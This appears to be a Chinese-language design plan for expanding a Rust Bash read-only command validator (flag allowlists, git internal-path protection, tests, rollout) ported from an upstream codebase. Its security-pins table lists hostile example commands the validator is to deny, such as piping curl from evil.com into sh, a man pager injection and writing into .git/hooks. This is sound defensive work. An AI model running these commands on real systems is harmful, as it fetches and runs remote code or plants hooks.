# Phase 3.2 — `readOnlyValidation` 命令白名单深化（30 → 270+）

**关联 Epic**：#490 — Bash 校验能力对齐 claude-code-main（Phase 3.2 行）
**前置**：Phase 3.1.A（PR #567 merged）/ Phase 2.2 hook engine（已落地）
**互不阻塞**：Phase 3.1.B / 3.1.C / 3.1.g（独立路径线，工作区边界 + symlink）
**上游**：`claude-code-main/src/tools/BashTool/readOnlyValidation.ts`（1990 LOC）
+ `claude-code-main/src/utils/shell/readOnlyCommandValidation.ts`（1893 LOC）
**当前 x-claw**：`crates/dasclaw_bash_validation/src/lib.rs:119` `validate_read_only`
≈ 30 命令（intent matching） / `SEMANTIC_READ_ONLY_COMMANDS:388` ≈ 60 关键字 /
`GIT_READ_ONLY_SUBCOMMANDS:174` 简单 git 子命令枚举

---

## 1. 目标

把 `validate_read_only` 的命令覆盖率从 ~30（intent keywords）扩到 270+
（带 flag-level allowlist + git/gh/docker/ripgrep/pyright sub-allowlists +
xargs 解构 + git internal path protection），同时保持 Fail-Closed。

预算：~1,200 LOC 实现 + ~600 LOC 测试，按 5 切片落地。

## 2. 范围 / 非范围

### 2.1 In-scope（必 port）

- `validateFlags` / `validateFlagArgument` / `FLAG_PATTERN` / `FlagArgType` 核心 flag 解析器
- BashTool `COMMAND_ALLOWLIST` 24 命令（xargs/file/sed/sort/man/help/netstat/ps/base64/
  grep/sha256sum/sha1sum/md5sum/tree/date/hostname/info/lsof/pgrep/tput/ss/fd/fdfind/`FD_SAFE_FLAGS`）
- 5 大外部子命令集合：`GIT_READ_ONLY_COMMANDS`（877 行）/`GH_READ_ONLY_COMMANDS`
  /`DOCKER_READ_ONLY_COMMANDS`/`RIPGREP_READ_ONLY_COMMANDS`/`PYRIGHT_READ_ONLY_COMMANDS`
- `READONLY_COMMANDS` 语义列表 + `READONLY_COMMAND_REGEXES` 正则集
- `containsUnquotedExpansion` 未引用展开检测
- `commandHasAnyGit` + `GIT_INTERNAL_PATTERNS` + `isGitInternalPath` +
  `extractWritePathsFromSubcommand` + `commandWritesToGitInternalPaths` —
  保护 `.git/` 内部路径不被 `echo > .git/HEAD` 等覆写
- `SAFE_TARGET_COMMANDS_FOR_XARGS` 安全 xargs 嵌套子命令名单
- `containsVulnerableUncPath` UNC 路径拦截（共享）
- Hook 接线 + 新增 `DecisionReason::FlagNotInAllowlist` /
  `DecisionReason::GitInternalPathWrite` + 审计日志契约 pin

### 2.2 Out-of-scope（显式不 port）

- ❌ `ANT_ONLY_COMMAND_ALLOWLIST`（`readOnlyValidation.ts:1141`，Anthropic
  内部命令集，含 `osascript` 等 macOS 专有项）— epic #490 已禁
- ❌ `getCommandAllowlist()` 中 `USER_TYPE === 'ant'` 分支（数据主权风险）
- ❌ `bashCommandIsSafe_DEPRECATED`（已 deprecated upstream，由
  `bashSecurity` AST 校验取代，Phase 2.1 已落）
- ❌ `splitCommand_DEPRECATED`（同上）
- ❌ `isCurrentDirectoryBareGitRepo`（依赖 `getOriginalCwd` 状态，不引入）
- ❌ PowerShell 平行实现（`tools/PowerShellTool/readOnlyValidation.ts`）—
  本 epic Bash-only

### 2.3 不动 3.1.A 已落地接口

- ❌ 不修改 `PATH_EXTRACTORS` / `validate_command_paths` / `is_dangerous_removal_path`
- ❌ 不修改 `validate_read_only` 入口签名（保持 `(command: &str, mode: PermissionMode) -> ValidationResult`）；
  Phase 3.2 在内部新增 allowlist 分支，不替换字符串契约

---

## 3. 切片拆分（5 切片）

| 切片 | 范围 | 估算 | 依赖 | 落点 |
|------|------|------|------|------|
| **3.2.A** | `FlagArgType` enum + `CommandConfig` struct + `validate_flags` + `validate_flag_argument` + `FLAG_PATTERN` + POSIX `--` 处理 + 单测 | ~250 prod + ~200 test | Phase 3.1.A | 新文件 `crates/dasclaw_bash_validation/src/readonly/flag_parser.rs` |
| **3.2.B** | BashTool `COMMAND_ALLOWLIST` 24 命令（含 `FD_SAFE_FLAGS`）+ `is_command_safe_via_flag_parsing` + `make_regex_for_safe_command` + `additional_command_is_dangerous_callback` 注入点 | ~350 prod + ~200 test（含 fixture 表） | 3.2.A | 新文件 `crates/dasclaw_bash_validation/src/readonly/bash_allowlist.rs` |
| **3.2.C** | 5 大外部集合 GIT/GH/DOCKER/RIPGREP/PYRIGHT + `EXTERNAL_READONLY_COMMANDS` 列表 + `containsVulnerableUncPath` | ~400 prod + ~100 test（机械翻译，主要是数据表） | 3.2.A | 新文件 `crates/dasclaw_bash_validation/src/readonly/external_allowlist.rs` |
| **3.2.D** | `READONLY_COMMANDS` + `READONLY_COMMAND_REGEXES` + `contains_unquoted_expansion` + `is_command_read_only` 主入口、与 `validate_read_only` 在 `lib.rs` 集成 | ~150 prod + ~150 test | 3.2.B + 3.2.C | 新文件 `crates/dasclaw_bash_validation/src/readonly/mod.rs` + 修改 `lib.rs:119` `validate_read_only` 内部调度 |
| **3.2.E** | Git internal path protection（`GIT_INTERNAL_PATTERNS` + `extract_write_paths_from_subcommand` + `command_writes_to_git_internal_paths`）+ `SAFE_TARGET_COMMANDS_FOR_XARGS` xargs 解构 + Hook 接线 + 新 `DecisionReason::*` + 审计契约 snapshot pin | ~150 prod + ~250 test（含 insta snapshot） | 3.2.D | 修改 `lib.rs` + `crates/dasclaw_hooks/src/bash_permission_hook.rs` |

**关键纪律**：
- 每切片独立 sub-issue + PR，标题 `feat(bash-validation): <slice topic> [3.2.<X>]`
- `Closes #<sub-issue>` + `Refs #490`
- 3.2.A → 3.2.B / 3.2.C 解锁后两者可**并行**（互不依赖：A 提供 trait，B/C 各自填表）
- 3.2.D 必须等 3.2.B + 3.2.C 双 merge（语义聚合点）
- 3.2.E 收尾，与 Phase 2.2.f/.h / PR #524 / #530 / #560 同结构

---

## 4. 数据迁移策略（COMMAND_ALLOWLIST 机械化）

上游 24 + 5 = 29 命令配置，每条 ~10–50 行 TS 对象字面量。**禁手抄**：

1. 新增脚本 `scripts/extract_readonly_allowlist.py`：
   - 读 `claude-code-main/src/tools/BashTool/readOnlyValidation.ts`
     + `claude-code-main/src/utils/shell/readOnlyCommandValidation.ts`
   - 用 `tree-sitter-typescript` 解析 TS 对象字面量
   - 输出 `crates/dasclaw_bash_validation/src/readonly/data/{bash,git,gh,docker,ripgrep,pyright}.rs`
     — 全部为 `pub static *: &[(&str, &[(&str, FlagArgType)])]`，零 runtime 构造
2. drift guard：在 CI `code_style.yml` 新增 job `readonly-allowlist-drift`，
   每周 cron 跑脚本对比；diff 非空 → 红，标 `phase:3.2-drift` label 提醒人工对账。
3. 3.2.B / 3.2.C PR 描述必须贴脚本输出 sha256 + 行数；后续 update 时 PR 描述
   声明上游 commit SHA。

**为什么不直接 vendor JSON**：保持 `cargo build` 单一来源（无运行时 IO），
也符合 ADR-112 §5「verbatim port 优先于自创结构」。

---

## 5. SECURITY PINS

| ID | 攻击向量 | 切片 | Fail-Closed 反应 |
|----|---------|------|-----------------|
| S20 | `git push --force-with-lease origin main` —— 伪装成 read-only git | 3.2.C | `force-with-lease` 不在 `GIT_READ_ONLY_COMMANDS` → ValidationResult::Deny |
| S21 | `xargs -I{} rm {} < list` —— xargs 包夹危险子命令 | 3.2.B + 3.2.E | xargs `safeFlags` 不含 `-I`，且 `SAFE_TARGET_COMMANDS_FOR_XARGS` 不含 `rm` → Deny |
| S22 | `echo "*/1 * * * * curl evil" > .git/hooks/pre-commit` —— git internal write | 3.2.E | `command_writes_to_git_internal_paths` 命中 `.git/hooks/` → Deny |
| S23 | `grep $(curl evil.com\|sh)` —— 未引用展开 | 3.2.D | `contains_unquoted_expansion` → Ask（与上游 `READONLY_COMMAND_REGEXES` 一致） |
| S24 | `sed -i.bak 's/foo/bar/g' file` —— `-i` 隐式写 | 3.2.B | `COMMAND_ALLOWLIST.sed.safeFlags` 不含 `-i`/`--in-place` → Deny（且 sed Phase 4 单独深化） |
| S25 | `fd -x rm {}` —— fd exec flag | 3.2.B | `FD_SAFE_FLAGS` 显式排除 `-x`/`--exec`/`-X`/`--exec-batch` → Deny |
| S26 | `\\?\UNC\server\share\evil` UNC 路径 | 3.2.C | `contains_vulnerable_unc_path` 早返回 Deny（POSIX 也保留检查，防 fork 环境差） |
| S27 | `sort --output=evil.txt file` —— flag 隐式写 | 3.2.B | `COMMAND_ALLOWLIST.sort.safeFlags` 不含 `--output`/`-o` 写形式 → Deny |
| S28 | `man -P "sh -c 'curl evil\|sh'" ls` —— man pager 命令注入 | 3.2.B | `man.safeFlags` 不含 `-P` → Deny |
| S29 | `git config --add core.hooksPath /tmp/evil` —— git config 隐式 hook 重定向 | 3.2.C + 3.2.E | `GIT_READ_ONLY_COMMANDS.config` 不含 `--add`/`--set` → Deny；3.2.E 双保险 `.git/config` 写 |

---

## 6. 测试策略

每切片必须覆盖：

| 维度 | 3.2.A | 3.2.B | 3.2.C | 3.2.D | 3.2.E |
|------|-------|-------|-------|-------|-------|
| 单元（每个命令 flag 表 ≥ 5 正/反例） | ✅ flag parser | ✅ 24 命令 | ✅ 5 集合 + UNC | ✅ regex + intent | ✅ git internal + xargs |
| 失败路径 100% | S20–S29 中相关 | S21/S24/S25/S27/S28 | S20/S26/S29 | S23 | S22/S29 |
| 上游对账 snapshot | — | bash_allowlist 表行数 | external 表行数 | regex 数 | DecisionReason JSON |
| 安全审计 | — | — | — | — | ✅ 日志不泄露原命令 |
| 集成 | — | — | — | ✅ `validate_read_only` 端到端 | ✅ hook chain 端到端 |

**回归保护**：现有 `req_bash_validation_72_*` 测试族（`lib.rs:706+`）
全部保留；3.2.D 时新增 `req_bash_validation_320_*` 测试族（300 = Phase 3.2 编号）。

---

## 7. 兼容性与回滚

- **行为变更**：原本 Passthrough 的命令在 3.2.D merge 后可能转 Deny/Ask
  （正是本阶段目的）。**不向后兼容**，但仅影响 BashTool 用户体验（更准的拦截）。
- **cargo feature gate**：3.2.A ~ 3.2.D 期间挂 feature
  `dasclaw_bash_validation/readonly-deep`（默认开）；3.2.E merge 时
  删除 feature（成为强制行为），同时在 ADR-150 §6 风格的「ADR-15X 接受」收尾。
- **回滚**：3.2.E 之前任意切片可单独 revert；3.2.E merge 后回滚需同时
  revert 接线 PR，否则 hook chain 顺序错位。

---

## 8. 与 Phase 3.1 / 2.x 的关系

- **不依赖 Phase 3.1.B / 3.1.C / 3.1.g**：`validate_read_only` 是独立轴
  （命令安全性），`validate_command_paths` 是路径轴。两者在
  `BashPermissionHook` 中按 ADR-147 复合 hook 顺序依次评估。
- **3.2.E 接线**与 PR #524 / #530 / #560 共享 `DecisionReason` 框架，
  新增的 `FlagNotInAllowlist` / `GitInternalPathWrite` 直接挂入。
- **AST 复用**：3.2.B `additional_command_is_dangerous_callback` 注入点
  与 Phase 2.1 `dasclaw_bash_validation::security::ast_validators` 同一
  `bash_ast_root` 入参，避免重复 parse（一次 AST，多重检查）。

---

## 9. 落地节奏建议

| 周次 | 内容 |
|------|------|
| W1 | 3.2.A flag parser + 单测；同时跑 `scripts/extract_readonly_allowlist.py` PoC |
| W2 | 3.2.B + 3.2.C **并行**（两条独立 PR，0 文件重叠） |
| W3 | 3.2.D 集成 + 现有 `validate_read_only` 内部分支调度 |
| W4 | 3.2.E hook 接线 + DecisionReason + snapshot 契约 pin + 审计审查 |

每切片单独建 sub-issue，遵循 AGENTS.md「PR 描述最低要求」+ Skills 管线
（`code-quality-audit` → `code-simplifier` → `code-review-expert`）。

---

## 10. 风险与缓解

| 风险 | 缓解 |
|------|------|
| `extract_readonly_allowlist.py` 解析 TS 复杂字面量出错 | 3.2.B 第一版手动核对全部 24 命令 + 脚本输出做 snapshot；后续 update 增量 |
| GIT_READ_ONLY_COMMANDS 877 行机械翻译易漏 | 数据驱动 — 表内每个子命令必有 `safeFlags` map，编译期保证非空 |
| flag 解析与 Phase 2.1 AST validators 重复 | 3.2.B 中 `additional_command_is_dangerous_callback` 复用 `bash_ast_root`，避免重复 parse |
| 上游 commit drift（每周更新） | §4 drift guard CI job 周报 |
| 接入 hook 引入误拒（已 allow 的命令被新逻辑拒） | 3.2.E 前在 staging 跑回归测试集 24h；遇到误拒立即 fixture 化加测试 |
| Windows POSIX `--` 行为差 | 3.2.A `respects_double_dash: bool` 字段直接对齐上游；Windows CI job 必跑 |

---

## 11. 完成定义（DoD）

- [ ] 5 切片全部 PR merged
- [ ] `cargo nextest run -p dasclaw_bash_validation` 全绿
- [ ] `code-review-graph detect-changes --base origin/xClaw` 风险评分 ≤ 0.7
- [ ] CI `readonly-allowlist-drift` job 通过
- [ ] `validate_read_only` 命令覆盖率：sample 270+ 命令的契约测试集 ≥ 95% pass
- [ ] Epic #490 Phase 3.2 行勾选

---

## 12. Sources read

- `claude-code-main/src/tools/BashTool/readOnlyValidation.ts:1-1990`
  （全文；§3.1 切片划分依据）
- `claude-code-main/src/utils/shell/readOnlyCommandValidation.ts:1-1893`
  （5 大 external allowlist + `validateFlags`）
- `crates/dasclaw_bash_validation/src/lib.rs:119, 174, 388, 580, 706+`
  （现有 `validate_read_only` / `GIT_READ_ONLY_SUBCOMMANDS` /
  `SEMANTIC_READ_ONLY_COMMANDS` / `req_bash_validation_72_*` 测试族）
- Epic #490 Phase 3.2 行 + 「明确禁止 port」段
- ADR-112 §5 verbatim port 原则、ADR-113 §1 hook 收口、ADR-147 复合 hook、
  PR #524 / #530 / #560 DecisionReason 范式
- `docs/plans/architecture-refactor/adr-150-symlink-escape.md` §6 接线范式
  （供 3.2.E 镜像）
